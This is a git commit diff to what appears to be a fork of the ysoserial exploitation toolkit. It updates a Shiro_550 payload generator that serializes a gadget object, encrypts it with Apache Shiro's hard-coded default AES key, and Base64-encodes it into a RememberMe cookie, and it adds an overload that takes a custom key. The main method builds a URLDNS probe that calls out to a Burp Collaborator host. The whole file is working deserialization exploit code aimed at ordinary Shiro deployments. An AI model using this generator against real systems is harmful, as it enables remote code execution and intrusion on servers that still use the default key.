e1257aead40a3c665317d1660c0ceabbe3d956f2
1nhann <inhanxx@gmail.com>
2022-07-18 11:20:05 +0800

    update shiro550

--- src/main/java/ysoserial/payloads/Shiro_550.java
+++ src/main/java/ysoserial/payloads/Shiro_550.java
@@ -8,16 +8,27 @@ import ysoserial.Serializer;
 public class Shiro_550 {
     public static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
     public static CipherService cipherService = new AesCipherService();
+    private byte[] key;
+    public Shiro_550(){
+        this.key = Shiro_550.DEFAULT_CIPHER_KEY_BYTES;
+    }
     public static void main(String[] args) throws Exception{
         Object evil = new URLDNS().getObject("http://7iqweabe6nz9u6subovv9j87cyip6e.burpcollaborator.net");
         String payload = new Shiro_550().getPayload(evil);
         System.out.println(payload);
     }
     public byte[] encrypt(byte[] serialized) {
-        ByteSource byteSource = cipherService.encrypt(serialized, DEFAULT_CIPHER_KEY_BYTES);
+        ByteSource byteSource = cipherService.encrypt(serialized, this.key);
         return byteSource.getBytes();
     }
     public String getPayload(final Object evil) throws Exception{
+        byte[] ser = Serializer.serialize(evil);
+        byte[] cookie = encrypt(ser);
+        cookie = Base64.encode(cookie);
+        return new String(cookie);
+    }
+    public String getPayload(final Object evil,String cipherKey) throws Exception{
+        this.key =  Base64.decode(cipherKey);
         byte[] ser = Serializer.serialize(evil);
         byte[] cookie = encrypt(ser);
         cookie = Base64.encode(cookie);
